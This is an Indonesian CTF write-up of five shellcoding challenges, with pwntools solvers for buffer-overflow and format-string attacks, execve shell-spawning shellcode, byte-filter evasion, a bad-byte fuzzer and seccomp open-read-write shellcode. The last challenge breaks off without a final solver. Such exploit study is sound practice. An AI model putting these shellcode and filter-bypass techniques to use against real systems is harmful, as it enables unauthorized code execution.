---
title: 'Write Up Shellcoding'
disqus: de13ugg1ng  
---

Shellcoding
===
Attachment -> ![downloads](https://img.shields.io/github/downloads/atom/atom/total.svg)

## Daftar Isi
[TOC]

##  Challange 1 - hackerclass/sysphone

###    Deskripsi
Shellcode
### TL; DR
Challange ini adalah **Shellcoding** biasa. Jika dilihat dari decompile File, terdapat instruction **__isoc99_scanf** dan **fget()** yang bisa di manfaatkan untuk Buffer Overflow agar bisa RET ke stack **local_108** yang akan kita isi dengan payload **spawn shellcode**. Kalau di check di bagian **init**, terdapat hint **return extraout_EAX;**. Karena di **ROP** ada gadget yang bisa melakukan **JMP RAX**. Kita hanya perlu melakukan **Buffer Overflow** -> Panggil gadget **JMP RAX** -> execute **shellcode**. Permasalahannya, **fgets()** yang dipakai pada binary ini telah di custome dan memiliki **restriction** untuk menulis langsung **asm syscall**. Kita harus melakukan beberapa teknik bypass pada **shellcode** yang dibuat. Dengan menggunakan asm **inc**.

![image](https://hackmd.io/_uploads/Bkmsvy4WGe.png)

Ya, jadi intinya disini kita melakukan modifikasi pada shellcode yang biasa agar bisa memanggil **syscall()** untuk **spawn shell**.

### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 
![image](https://hackmd.io/_uploads/ByERXyVbGe.png)


Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/rktu41V-Me.png)
![image](https://hackmd.io/_uploads/rJMF4k4-fx.png)

Nah, bisa dilihat instruction **local_10c** berfungsi sebagai buffer / max char dari **fgets()**. Jadi dimasukkan 1000 ke **local_10c**. Maka **fgets()** akan menerima input sampai 1000 - 1. Karena newline di akhir.

![image](https://hackmd.io/_uploads/SJs8_k4-zx.png)

Lalu di bagian init terdapat **return extraout_EAX;**. Artinya tidak perlu melakukan leak stack, karena sudah ada ROP yang melompat ke stack terakhir.

![image](https://hackmd.io/_uploads/Hy93dy4-fl.png)

Karena RAX menyimpan address dari stack di instruction **LEA RAX -> lcoal_108...**. Maka valid jika dikatakan RAX akan **jump** ke alamat **stack terakhir**.

![image](https://hackmd.io/_uploads/ByVXY1NWfg.png)

Nah, ini yang agak ngeselin nih. AKu butuh waktu sekitar 30 menit untuk sadar kalo **fgets()** pada chall di custom. Dan melakukan **restriction** terhadap hex **'\x0f'** dan **'\x05'**. Yang dimana jika di print ke char,

![image](https://hackmd.io/_uploads/HkP95yVZGg.png)

Adalah instruction untuk **syscall()**. 

![image](https://hackmd.io/_uploads/BJ8JoJE-ze.png)

Jadi disini saya sedikit mengubah shellcode nya agar tidak langsung memanggil **syscall**, tapi menggunakan inc untuk **menyembunyikan** instruction **syscall()**.

Jadi Alur Exploitnya adalah:
**Buffer Overflow** -> **JMP RAX** -> **shellcode** -> **spawn shell** -> cat **flag.txt**.

![image](https://hackmd.io/_uploads/BkuwoJ4-Ml.png)
![image](https://hackmd.io/_uploads/Byl_jk4ZMg.png)

SOLVER:
```
from pwn import *

context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './chall'
p = process(chall)
elf = context.binary = ELF(chall, checksec=False)

# gdb.attach(p, gdbscript='''
# ''')

shellcode = asm('''
xor rdx, rdx                    
mov rbx, 0x68732f6e69622f2f     
shr rbx, 0x8                    
push rbx                        
mov rdi, rsp                    

xor rax, rax                    
push rax                         
push rdi                         
mov rsi, rsp                     

mov al, 59
lea r10, [rip + bypass]
inc byte ptr [r10]

bypass:
.byte 0x0e, 0x05                  
''')

print(shellcode)
payload = shellcode
payload += b'\x90' * (264 - len(shellcode))
payload += p64(0x000000000040116c)
payload = payload + b'A' * (1000 - len(payload))

p.sendline(str(len(payload)).encode())
sleep(3)
p.send(payload)
p.interactive()

# Exploit:
# /bin/sh\x00 tapi hex nya ->   0x68732f6e69622f
# //sin/sh tapi hex nya ->      0x68732f6e69622f2f
# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```


##  Challange 2 - htbchallenge/execute

###    Deskripsi
Shellcode
### TL; DR
Challange ini adalah **Shellcoding** biasa. Jika dilihat dari hasil decompile. Input akan dimasukkan ke **local_58** dan tidak terdapat Buffer Overflow. Hanya saja di bagian bawah terdapat **((code )local_58)();** yang artinya input akan di execute sebagai bagian dari instruction **Binary File**. Tapi sebelumnya terdapat function **check()** yang akan melakukan checking untuk setiap char dengan sebuah **restriction** yang sudah di set.

![image](https://hackmd.io/_uploads/ryFhJgEWGl.png)

Ya, jadi intinya disini kita harus melakukan **modifikasi** input **shellcode** agar tidak terkena **restriction** sama sekali. Jika berhasil, maka program akan langsung **spawn shell**. 

### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 

![image](https://hackmd.io/_uploads/BJTaJx4bGl.png)

Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/SkCCyeVZGl.png)

Disini bisa langsung dilihat kalau input akan di execute sebagai insturction juga di bagian paling bawah. Jadi bisa langsung input shellcode nya kedalam **local_58**. Tapi permasalahannya terdapat function check yang jika dilihat.

![image](https://hackmd.io/_uploads/SkGHxxEZMe.png)

Dia akan mengecek input kita satu persatu dengan restriction yang sudah di set pada **local_78**. Tapi disini terdapat **vulnerability** juga, karena **local_78** hanya terdapat **16 restriction**. Dan input **shellcode** bisa lebih dari **16 char**. Maka hanya perlu memperhatikan **16 char pertama** agar tidak terkena **restriction**. karena di char setelahnya akan **nge bug** dan di compare dengan **ketiadaan**.

```a
#!/usr/bin/env python3
from pwn import *
import itertools

# Supress error pwntools saat asm gagal compile
context.update(arch='amd64', os='linux', log_level='error')

# ================= CONFIGURE YOUR RESTRICTIONS HERE =================
# Ubah BAD_BYTES ini sesuai dengan blacklist di soal challenge kamu!
BAD_BYTES = bytes([
    ord(';'),      # [0] 
    ord('T'),      # [1]
    ord('b'),      # [2]
    ord('i'),      # [3]
    ord('n'),      # [4]
    ord('s'),      # [5] (Ingat fungsi perbandingannya punya bug, 
    ord('h'),      # [6]  mungkin 's' ga bakal di cek, tapi gpp masukkan saja)
    -10 & 0xff,    # [7]  Angka desimal negatif (-10)
    -0x2e & 0xff,  # [8]  Angka hex negatif (-0x2e)
    -0x40 & 0xff,  # [9]
    ord('_'),      # [10]
    -0x37 & 0xff,  # [11]
    ord('f'),      # [12]
    ord('l'),      # [13]
    ord('a'),      # [14]
    ord('g'),      # [15]
    0              # [16] (Null byte 0x00)
])

print("Blacklist hex: ", BAD_BYTES.hex())
# Outputnya otomatis jadi: 3b5462696e7368f6d2c05fc9666c616700

# Penjelasan:
# 1. ord('x') mengubah karakter menjadi nilai integer desimalnya (contoh: ord('A') = 65).
# 2. & 0xff berguna untuk mengambil 8-bit terakhir saja (1 byte). Kalau kamu punya -10, di Python jika di-bitmask & 0xff, dia akan dikonversi menjadi 246 (atau 0xf6), persis sama perilakunya dengan kompilator C.
# 3. bytes([...]) akan mengubah list integer tersebut menjadi sekumpulan byte asli (byte object di Python).

# ====================================================================

r64 = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'rbp', 'rsp', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15']
r32 = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 'ebp', 'esp', 'r8d', 'r9d', 'r10d', 'r11d', 'r12d', 'r13d', 'r14d', 'r15d']
r16 = ['ax', 'bx', 'cx', 'dx', 'si', 'di', 'bp', 'sp', 'r8w', 'r9w', 'r10w', 'r11w', 'r12w', 'r13w', 'r14w', 'r15w']
r8  = ['al', 'bl', 'cl', 'dl', 'sil', 'dil', 'bpl', 'spl', 'r8b', 'r9b', 'r10b', 'r11b', 'r12b', 'r13b', 'r14b', 'r15b']

def is_safe(bc):
    return not any(b in BAD_BYTES for b in bc)

def test_inst(inst):
    try:
        bc = asm(inst)
        if is_safe(bc): return bc
    except:
        pass
    return None

def fuzz_category(title, combinations):
    print(f"\n[+] === {title} ===")
    found = 0
    for inst in combinations:
        bc = test_inst(inst)
        if bc:
            print(f"  {inst:<25} -> {bc.hex()}")
            found += 1
    if found == 0:
        print("  [-] No safe instruction found for this category.")

def fuzz_zeroing():
    insts = []
    for reg in r64 + r32:
        insts.extend([f"xor {reg}, {reg}", f"sub {reg}, {reg}"])
    fuzz_category("ZEROING REGISTERS", insts)

def fuzz_pushes_pops():
    push_insts = [f"push {reg}" for reg in r64]
    pop_insts  = [f"pop {reg}" for reg in r64]
    fuzz_category("PUSH REGISTERS", push_insts)
    fuzz_category("POP REGISTERS", pop_insts)

def fuzz_inc_dec():
    insts = []
    for reg in r64 + r32 + r8:
        insts.extend([f"inc {reg}", f"dec {reg}"])
    fuzz_category("INCREMENT / DECREMENT", insts)

def fuzz_syscall_alternatives():
    fuzz_category("SYSCALLS", ["syscall", "int 0x80", "sysenter"])

def fuzz_custom_mov(dst, src):
    insts = [
        f"mov {dst}, {src}",
        f"push {src}; pop {dst}",
        f"xchg {dst}, {src}"
    ]
    fuzz_category(f"MOVING {src} TO {dst}", insts)

def fuzz_custom_set_imm(reg, val):
    insts = [
        f"mov {reg}, {val}",
        f"push {val}; pop {reg}"
    ]
    if val == 0:
        insts.extend([f"xor {reg}, {reg}", f"sub {reg}, {reg}"])
    elif val == 59:
        insts.extend([
            f"mov {reg}, 60; dec {reg}",
            f"push 60; pop {reg}; dec {reg}",
            f"push 58; pop {reg}; inc {reg}"
        ])
    fuzz_category(f"SET {reg} to {val}", insts)

if __name__ == '__main__':
    print(f"[*] Starting Fuzzer...")
    print(f"[*] Bad Bytes: {BAD_BYTES.hex()}")
    fuzz_zeroing()
    fuzz_pushes_pops()
    fuzz_inc_dec()
    fuzz_syscall_alternatives()
    print("\n\n[!] === CUSTOM TARGETS ===")
    fuzz_custom_mov("rdi", "rsp")
    fuzz_custom_mov("rax", "rbx")
    fuzz_custom_set_imm("al", 59)
    fuzz_custom_set_imm("rax", 0)
```
Jadi disini saya sudah membuat fuzzing untuk seleksi instruction mana saja yang bisa digunakan dan aman dari restrictionnya. **(pake gemini)**

Jadi inti exploitnya hanya merakit shellcode, agar tidak terkenal restriction.

![image](https://hackmd.io/_uploads/H1x8EMg4Zzx.png)

SOLVER:

```
from pwn import *

context.update(arch='amd64', os='linux')

chall = './execute'
p = process(chall)

original_string = 0x68732f6e69622f2f
xor_key         = 0x2222222222222222
encoded_string  = original_string ^ xor_key  

shellcode_asm = f"""
    xor ebx, ebx
    mov edx, ebx
    mov esi, ebx
    push rbx
    movabs rbx, {hex(encoded_string)}
    movabs rbp, {hex(xor_key)}
    xor rbx, rbp
    push rbx
    mov rdi, rsp
    push 60
    pop rax
    dec eax
    syscall
"""
cleaned_shellcode = asm(shellcode_asm)
print('ASM: ',cleaned_shellcode)
print('LEN: ',len(cleaned_shellcode))
print('DISASS: ',disasm(cleaned_shellcode))

p.sendline(cleaned_shellcode)
p.interactive()
```



##  Challange 3 - lksjatim/backdoor_anonymous

###    Deskripsi
Shellcode
### TL; DR
Challange ini adalah **Shellcoding** yang agak gak biasa. Jika dilihat dari hasil decompile. Pertama, harus melakukan overwrite untuk nilai dari sebuah param. Lalu akan JUMP ke **gets()**. Dari sini jika ingin menggunakan shellcoding. Harus melakukan leak untuk stack yang menyimpan input dari **gets()**. Jadi caranya, pertama lakukan **fmstr_payload** untuk set nilai dari param **hackermode** -> sampai di **gets()** -> **Buffer Overflow** -> **RET** ke main -> **leak address stack** -> Hitung **offset** sampai ke **stack** dari **gets()** -> sampai ke **gets()** -> Input **shellcode** -> **RET** ke stack dari **gets()** -> **spawn shell** -> **cat flag.txt**. 

![image](https://hackmd.io/_uploads/HJAf_l4bMg.png)

Ya, jadi intinya disini kita memanfaatkan vulnerability **printf** untuk mengubah nilai **hackermode** dan leak **stack address**. Dan panjang byte dari **shellcode** juga harus kurang dari **32 byte**. Karena buffer dari **local_28** which is tempat menyimpan input dari **gets()** hanya **32 char**.

### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 

![image](https://hackmd.io/_uploads/rkxTOxVbMe.png)

Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/rkYR_gNWfx.png)

Disini terlihat vulnerability printf. Yang bisa dimanfaatkan untuk leak address. Tapi karena tidak ada function win, kita telusuri lebih jauh dulu ke dalam function **analyze()**.

![image](https://hackmd.io/_uploads/HJczKg4bGx.png)

Nah, terdapat if else disini. kalau ingin sampai ke **gets()**. Harus membuat param **hackermode** memiliki nilai **0x19 atau 25**.

![image](https://hackmd.io/_uploads/HyKs9lN-zg.png)

Kalau di check dari gdb, ternyata address dari hackermode ada di **0x40403c**. Jadi jika kita set **0x40403c** menjadi 25. Seharusnya akan masuk kedalam **gets()**.

![image](https://hackmd.io/_uploads/H15Msx4Zzl.png)

Terbukti, setelah di set menjadi 25. instruction **JE** langsung berubah centang.

Jadi Exploit nya adalah:
**fmstr_payload** -> masuk ke **gets()** -> **Buffer Overflow** -> **RET** ke main -> leak **stack address** -> masuk ke **gets()** lagi -> send **shellcode** + **Buffer Overflow** -> **RET** ke stack yang berisi **shellcode** -> **Spawn shell** -> **cat flag.txt**.

![image](https://hackmd.io/_uploads/S1yqagNZMg.png)

SOLVER:

```
from pwn import *

# context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './backdoor'
p = process(chall)
elf = context.binary = ELF(chall, checksec=False)

gdb.attach(p, gdbscript='''
break *0x000000000040119c
''')

payload = fmtstr_payload(8, {0x40403c: 25}, write_size='int')
p.sendline(payload)

sleep(3)
payload = b'A'* 40
payload += p64(0x000000000040119d)
p.sendline(payload)
p.recv()
sleep(1)
p.sendline(b'%13$p')
p.recv()
p.recvuntil(b': ')

hasil = p.recv().decode().strip()
stack = int(hasil, 16) - 0xb8

print(hex(stack))

# Shellcode: execve("/bin/sh", NULL, NULL) - 22 Bytes
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x6a\x3b\x58\x0f\x05"

print(len(shellcode))
payload = shellcode + b'A' * (40 - len(shellcode))
payload += p64(stack)
p.sendline(payload)

# print(disasm(shellcode))

p.interactive()


# Exploit:
# # /bin/sh\x00 tapi hex nya ->   0x68732f6e69622f
# //sin/sh tapi hex nya ->      0x68732f6e69622f2f
# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```


##  Challange 4 - lksn2024/brainrot

###    Deskripsi
Shellcode
### TL; DR
Challange ini adalah **Shellcoding** yang biasa. Jika dilihat dari hasil decompile, terdapat function **sandbox()** yang berisi dengan **seccomp rule**. Dimana syscall yang diizinkan disini hanya **0**, **1**, dan **2**. Yaitu **Read**, **Write**, dan **Open**. Dan pada function main, Binary memanggil instruction read dengan max input **0x100 byte**. Lalu melakukan execute input read sebagai **Binary Instruction**. Jadi disini harus membuat payload **shellcoding ORW** namanya.

![image](https://hackmd.io/_uploads/BJqfPOP-Mg.png)

Ya, jadi intinya disini kita memanfaatkan Open Read Write untuk **membuka file** -> **membaca isi file** -> **menuliskan isi file**.

### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 

![image](https://hackmd.io/_uploads/rJPSrdwZzg.png)

Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/HkRDvuwbGl.png)

Bisa dilihat, pada function **read()**, input kita disimpan ke variable **func**. Lalu dibawahnya persis variable **func** di **execute** sebagai **code** pada **Binary File** itu sendiri.

![image](https://hackmd.io/_uploads/SJJRD_DZfg.png)

Tapi sebelum read, program akan melompat ke function **sandbox()**. Dimana disini terdapat **seccomp rule**, yang memberikan **restriction** terhadap penggunaan syscall.
**seccomp_init(0)** -> Default setting untuk restrict semua syscall.
**seccom_rule_add** -> Menambahkan syscall yang boleh dipergunakan.
**seccomp_load** -> Mengaktifkan seccomp rule.

Jadi pada Binary File ini hanya diizinkan untuk menggunakan syscall 0, 1, dan 2. Dimana itu adalah syscall untuk **Read**, **Write**, dan **Open**.

```a
shellcode = asm('''
                sub rsp, 0x200
                sub rax, rax
                push rax
                mov rbx, 0x000000007478742e
                push rbx
                mov rbx, 0x6974736b65697474
                push rbx
                mov rbx, 0x6f6467616c662f2e
                push rbx

                mov rdi, rsp
                mov rsi, 0x0
                mov rdx, 0x0
                mov rax, 0x2
                syscall
                mov r8, rax

                mov rdi, r8
                lea rsi, [rsp - 0x100] 
                mov rdx, 0x100
                mov rax, 0x0
                syscall
                
                mov rdi, 0x1
                lea rsi, [rsp - 0x100]
                mov rdx, rax
                mov rax, 0x1
                syscall

                mov rax, 0x3c
                syscall
''')
```
Jadi ini **shellcoding** yang ku buat. Dengan alur:
Menulis string **flagdottieksti.txt** ke rsp -> memanggil **syscall open** -> memindahkan fd hasil open ke **r8** -> memanggil **syscall read** -> memanggil **syscall write**.

![image](https://hackmd.io/_uploads/ryQY9_P-zl.png)
![image](https://hackmd.io/_uploads/HJFKqdPWfx.png)

SOLVER:
```
from pwn import *

context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './chall'
p = process(chall)
elf = context.binary = ELF(chall, checksec=False)

gdb.attach(p, gdbscript='''
''')

# ./flagdo -> 0x6f6467616c662f2e
# ttieksti -> 0x6974736b65697474
# .txt\x00\x00\x00\x00 -> 0x000000007478742e

shellcode = asm('''
                sub rsp, 0x200
                sub rax, rax
                push rax
                mov rbx, 0x000000007478742e
                push rbx
                mov rbx, 0x6974736b65697474
                push rbx
                mov rbx, 0x6f6467616c662f2e
                push rbx

                mov rdi, rsp
                mov rsi, 0x0
                mov rdx, 0x0
                mov rax, 0x2
                syscall
                mov r8, rax

                mov rdi, r8
                lea rsi, [rsp - 0x100] 
                mov rdx, 0x100
                mov rax, 0x0
                syscall
                
                mov rdi, 0x1
                lea rsi, [rsp - 0x100]
                mov rdx, rax
                mov rax, 0x1
                syscall

                mov rax, 0x3c
                syscall
''')

p.sendline(shellcode)

p.interactive()

shellcraft()

# Exploit:
# Strategi awal = Mbuat asm ORW -> Open -> Read -> Write. 

# # /bin/sh\x00 tapi hex nya ->   0x68732f6e69622f
# //sin/sh tapi hex nya ->      0x68732f6e69622f2f
# code ubah strings 8 byte menjadi hex. Agar bisa dimasukkan ke ASM: 
# python -c "from pwn import * ; print(hex(u64(b'./flagdo')))"

# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

##  Challange 5 - pwnable_tw/start

###    Deskripsi
Shellcode
### TL; DR
Challange ini adalah **Shellcoding** yang biasa. Dari hasil decompile terdapat vulnerability Buffer Overflow yang bisa kita gunakan untuk leak **address stack**. Lalu setelah leak stack, baru bisa memasukkan shellcode ke bagian **read()** karena instruction ini menerima input sampai **60 char**. Tapi masalahnya **capacity stack** sampai ke **RET** hanya **20 byte**. Sedangkan shellcode yang kubuat **24 byte**. Sehingga payload yang memungkinkan adalah:
send **20 byte** sampah -> **RET** ke **syscall write** -> **leak stack** -> masuk ke **instruction read()** lagi -> input read dengan **20 byte** sampah + **Address stack** + **shellcode** -> **RET** ke stack -> **execute shellcode**.
![image](https://hackmd.io/_uploads/ryLDkFDWfx.png)

Ya, jadi intinya disini kita memanfaatkan **read()**.

### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 

![image](https://hackmd.io/_uploads/HJXD42wZGe.png)

Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/SJ8gsjD-Mg.png)

Disini ga terlalu kelihatan ya code nya. Jadi aku coba buat liat dari gdb.

![image](https://hackmd.io/_uploads/SyaJBnP-Ge.png)

Nah, dari gdb. Bisa dilihat jika program melakukan 2 kali **syscall**. Pertama **syscall write** dan yang kedua **syscall read**. 

![image](https://hackmd.io/_uploads/Sk-trhDZzg.png)

Dari **syscall read**. Bisa dilihat max char nya adalah 0x3c atau **60 byte**. Dan jika di tes dengan menggunakan cyclic ternyata bisa dilakukan **Buffer Overflow**.

![image](https://hackmd.io/_uploads/B1qaH2PZze.png)
![image](https://hackmd.io/_uploads/SJm0S3Dbzg.png)
![image](https://hackmd.io/_uploads/BywZL2vWMg.png)

Nah, ternyata offset sampai ke RET adalah **20 byte**. Dan jika dilihat registernya:

![image](https://hackmd.io/_uploads/SJ_QU3v-Mg.png)

ecx menyimpan address dari stack. Dari sini jika **diubah RET** nya ke bagian **syscall write**. Binary akan **print address** dari **ecx** which is **stack address**, karena **syscall write** akan menulis informasi dari **ecx**.

![image](https://hackmd.io/_uploads/rJe2U2wWfx.png)

**Script Leak Address Stack**:

```a
from pwn import *

context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './start'
p = process(chall)
elf = context.binary = ELF(chall, checksec=False)

gdb.attach(p, gdbscript='''
''')

payload = b'\x90' * 20
payload += p32(0x08048087)
p.recv()
# sleep(10)
p.sendline(payload)
hasil = p.recv(4)
print(hasil)
hasilHex = enhex(hasil)
print('mentah: ',hasilHex)

hasil = hex(u32(hasil))
print('HEX: ', hasil)
hasil = int(hasil, 16) + 0x6c

print(hex(hasil))
p.interactive()
```

Nah, setelah melakukan leak **address stack**, Program masuk ke dalam **syscall read** lagi. Disini lakukan Buffer Overflow lagi dan RET ke stack, sekalian di paling akhir masukkan **shellcode**.
Jadi **input ke read** nya:
**20 Byte sampah + Address Leak yang sudah di proses + shellcode**

Address Leak yang di input harus menunjuk address dimana shellcode nya ada. Disini kalian bisa mainin gdb nya aja sampai dapat.
*Hint: gunain x/i untuk melihat instruction dari stack nya*.


![image](https://hackmd.io/_uploads/Skv25iDWGx.png)
![image](https://hackmd.io/_uploads/HJQMoowZfl.png)
